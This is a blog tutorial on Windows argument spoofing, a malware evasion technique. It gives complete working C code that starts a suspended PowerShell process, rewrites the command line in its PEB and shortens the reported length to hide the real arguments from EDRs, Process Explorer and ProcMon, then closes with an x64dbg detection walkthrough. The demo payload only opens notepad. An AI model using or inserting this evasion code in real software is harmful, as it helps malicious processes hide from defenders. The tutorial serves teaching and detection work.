---
title: "Argument Spoofing"
author: "Adria"
date: 2025-05-03 17:30:00 +0800
categories: [Theory]
tags: [Windows,Malware,Evasion]
math: true
render_with_liquid: false
---

In this article we will delve into a technique used by malware to spoof the arguments sent to a process. EDRs use the command line to detect some malicious parameters and raise alerts, so being able to spoof them is a powerful evasion technique. 

![hacker_hackingsecurity_threat_crime_criminal_with_black_hat_mask_and_crowbar_breaks_into_a_laptop_by_drdrawer_shutterstock_1364574311_royalty-free_digital-only_2400x1600-100890822-orig.webp](/img/posts/ArgSpoofing/hacker_hackingsecurity_threat_crime_criminal_with_black_hat_mask_and_crowbar_breaks_into_a_laptop_by_drdrawer_shutterstock_1364574311_royalty-free_digital-only_2400x1600-100890822-orig.webp)

# How Argument Spoofing Works

To do this, the malware just need to tamper the PEB structure of a process in a suspended state. Remember that the PEB (Process Environment Block) is a data structure that stores information about a process. 

From [Windows documentation](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb): 

```c
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;
```

We can see the `ProcessParameters`  element, which is a pointer to [RTL_USER_PROCESS_PARAMETERS struct](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters): 

```c
typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
```

If an attacker can modify the `CommandLine` element, they can tamper the commands sent to the process. 

Some tools such as net Process Explorer, read the `CommandLine.Buffer` at runtime, using the `CommandLine.Length`  to know how many bytes should be reeded. Since they do this at runtime, they would detect the spoofing and see the real arguments. 

However, we can also control the `CommandLine.Length`, se we can control what part of the payload is going to be exposed. In this example, we will make only “powershell.exe” readable. 

Let’s get hands on. I will now comment the code. We will create a function named `ArgumentSpoofer` which will be the responsible of doing everything we explained above. 

The `ArgumentSpoofer`function will only take as IN parameters the fake and the spoofed args and the OUT parameters will be the created process ID, a handle of the process and a handle of the thread. We first initialize all variables needed 

```c
BOOL ArgumentSpoofer(IN LPWSTR szFakeArgs, IN LPWSTR szSpoofedArgs, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
	NTSTATUS                      STATUS = NULL;

	WCHAR                         szProcess[MAX_PATH];

	STARTUPINFOW                  Si = { 0 };
	PROCESS_INFORMATION           Pi = { 0 };

	PROCESS_BASIC_INFORMATION     PBI = { 0 };
	ULONG                         uRetern = NULL;

	PPEB                          pPeb = NULL;
	PRTL_USER_PROCESS_PARAMETERS  pParms = NULL;

	Si.cb = sizeof(STARTUPINFOW);
	...
```

The next step is to obtain the address of the `NtQueryInformationProccess` function that will allow us to obtain the PEB. Since this function is **not declared** in the `Windows.h` header, we need to manually resolve its address at runtime using `GetProcAddress`:

```c
	...
	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL)
		return FALSE;
	...
```


> To make the above code work, you must define the function's type beforehand. Ensure the following typedef is declared at the beginning of your code:
```c
typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
	);
```
{: .prompt-info}

The next step is to create the process in a suspended state. We will copy the fake arguments in a buffer and send it in the Command Line parameter of the function. 

```c

	...
	lstrcpyW(szProcess, szFakeArgs);

	//Create a suspendedProcess

	if (!CreateProcessW(NULL,szProcess,NULL,NULL,FALSE,CREATE_SUSPENDED | CREATE_NO_WINDOW,NULL,L"C:\\Windows\\System32\\",&Si,&Pi)) {
		printf("\t[!] CreateProcessW Failed with Error : %d \n", GetLastError());
		return FALSE;
	} 
	...
```

Now that we have a process in a suspended state, we want to retrieve its PEB in order to access and modify the process arguments before resuming execution.

1. We can obtain a pointer to the PEB by using the `NtQueryInformationProcess` using the `ProcessBasicInformation` as a flag. This will return a `PROCESS_BASIC_INFORMATION` struct that contains the PEB base address. 

```c
...
// Getting the PROCESS_BASIC_INFORMATION structure of the remote process which contains the PEB address
if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0) {
	printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
	return FALSE;
}
...
```

1. Now that we have the address of  `PROCESS_BASIC_INFORMATION` in `PBI` , we can read the PEB since its base address is defined in the PBI. We will use the `ReadProcessMemory` function for this: 

```c
	...
	//Reading the PEB structure
	SIZE_T	sNmbrOfBytesRead = NULL;
	//Allocate space in the heap to read the PEB content
	pPeb = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));

	//pPeb will contain the address where the PEB can be readed
	if(!ReadProcessMemory(Pi.hProcess, PBI.PebBaseAddress, pPeb, sizeof(PEB),&sNmbrOfBytesRead) || sNmbrOfBytesRead != sizeof(PEB)) {
		printf("[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Read : %d Of %d \n", sNmbrOfBytesRead, sizeof(PEB));
	...
```

1. After having access to the PEB, we can use it to read it again but now we will obtain the Process Parameters base address:

```c
...
sNmbrOfBytesRead = NULL;
//Allocate space in the heap to store the parameters content
pParms = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF);

//pParams will contain the address where the pParams can be readed
if (!ReadProcessMemory(Pi.hProcess, pPeb->ProcessParameters, pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF, &sNmbrOfBytesRead) || sNmbrOfBytesRead != sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF) {
	printf("[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
	printf("[i] Bytes Read : %d Of %d \n", sNmbrOfBytesRead, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF);
	return FALSE;
}
...
```

> You  can notice that we read the size of `RTL_USER_PROCESS_PARAMETERS` and an additional `0xFF` (255 bytes). This is just to ensure that we read the `CommandLine.Buffer` pointer and avoid problems.  
{: .prompt-info}

1. Now that we have access to the pointer of the `CommandLine.Buffer`, we can use it to write there the real command line that will be executed. 

```c
...
	// Use pParams to get the addres to the CommandLine.Buffer and write the real argument.
	
	SIZE_T sNmbrOfBytesWritten = NULL;
	if (!WriteProcessMemory(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szSpoofedArgs, (DWORD)(lstrlenW(szSpoofedArgs) * sizeof(WCHAR) + 1), &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != (DWORD)(lstrlenW(szSpoofedArgs) * sizeof(WCHAR) + 1)) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Written : %d Of %d \n", sNmbrOfBytesWritten, (DWORD)(lstrlenW(szSpoofedArgs) * sizeof(WCHAR) + 1));
		return FALSE;
	}
...
```

1. Finally, we have to update the `CommandLine.Length` so only “powershell.exe” is readable by tools such as Process Explorer. 

```c
...
	DWORD dwNewLen = sizeof(L"powershell.exe");
	sNmbrOfBytesWritten = NULL;
	if (!WriteProcessMemory(Pi.hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLen, sizeof(DWORD),&sNmbrOfBytesWritten) || sNmbrOfBytesWritten != sizeof(DWORD)) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Written : %d Of %d \n", sNmbrOfBytesWritten, sizeof(DWORD));
		return FALSE;
	}
	...
```

With this, we only need to cleanup the memory space and return the required parameters: 

```c
...
	// Cleaning up
	HeapFree(GetProcessHeap(), NULL, pPeb);
	HeapFree(GetProcessHeap(), NULL, pParms);

	// Resuming the process with the new paramters
	ResumeThread(Pi.hThread);

	// Saving output parameters
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// Checking if everything is valid
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}
```

We only need a `main()` function:

```c
#define FAKE_ARGUMENTS			L"powershell.exe this argument is legit"		
#define SPOOFED_ARGUMENTS		L"powershell.exe -NoExit -c notepad.exe"

int main() {
	HANDLE		hProcess = NULL,
				hThread = NULL;
	DWORD		dwProcessId = NULL;

	wprintf(L"[i] Target Process  Will Be Created With [Fake Arguments] \"%s\" \n", FAKE_ARGUMENTS);
	wprintf(L"[i] The Actual Arguments [Spoofed Arguments] \"%s\" \n", SPOOFED_ARGUMENTS);

	if (!ArgumentSpoofer(FAKE_ARGUMENTS, SPOOFED_ARGUMENTS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}

	printf("\n[#] Press <Enter> To Quit ... ");
	getchar();
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
}
```

As you can see in the image below, I executed the executable and a notepad.exe was spawned, however, if I check the process using ProcMon, I see that the argument was “**powershell.exe This argument is not malicious ok**” instead. 

![image.png](/img/posts/ArgSpoofing/image.png)

And in the Process Explorer, we see that only powershell.exe is visible because we modified the `CommandLine.Length`: 

![image.png](/img/posts/ArgSpoofing/image%201.png)

# Detecting Argument Spoofing

At the time of writing this, there is not a silver bullet to detect this. It is capable to bypass the EDRs and spoof process analysis and log tools such. 

I assume that an EDR would need to compare the real `CommandLine.Buffer` content in memory with the Command Line that was used when creating the process, but this could be quite intrusive and slow down the performance of your pc.  

Anyway, in this section we will use x64dbg to analyze the process memory and do what a forensic analyst should do when trying to search for this. 

 

> Even when using x64dbg, I had to add a `getchar()` in the code before resuming the process because when resuming it, the `CommandLine.Buffer` memory space gets overwritten and is impossible to find the real argument. I haven’t found an explanation for this. 
{: .prompt-info}

1. We will first open x64dbg and attach it to the powershell process. 
2. Now, we can use the `peb()` command to get the address of the PEB:

![image.png](/img/posts/ArgSpoofingimage%202.png)

1. If we referrer to the PEB structure, we can see that the Process Parameters is in the offset 0x20. so we could do peb() + 0x20. We can see in the memory content another memory address, that belongs to **RTL_USER_PROCESS_PARAMETERS structure, in this example the memory address is `0x000001C4E57A0000`**  .
    
    ![image.png](/img/posts/ArgSpoofing/image%203.png)
    
2. We can now go to the “Memory Map” section, press Control + G and paste the memory address. Select the correct memory address, right click and “See it in dump”
    
    ![image.png](/img/posts/ArgSpoofing/image%204.png)
    
3. If we go back to the CPU tab, in the dump we will see the correct memory address. Now, we want to see the `CommandLine` pointer, which has an offset of 0x70: `0x000001C4E57A06C4` 
    
    ![image.png](/img/posts/ArgSpoofing/image%205.png)
    
4.  We can see this address in the same memory dump, so if we scroll down we can search for it. We will see in the ASCII table the contents of the real command line executed:

![image.png](/img/posts/ArgSpoofing/image%206.png)
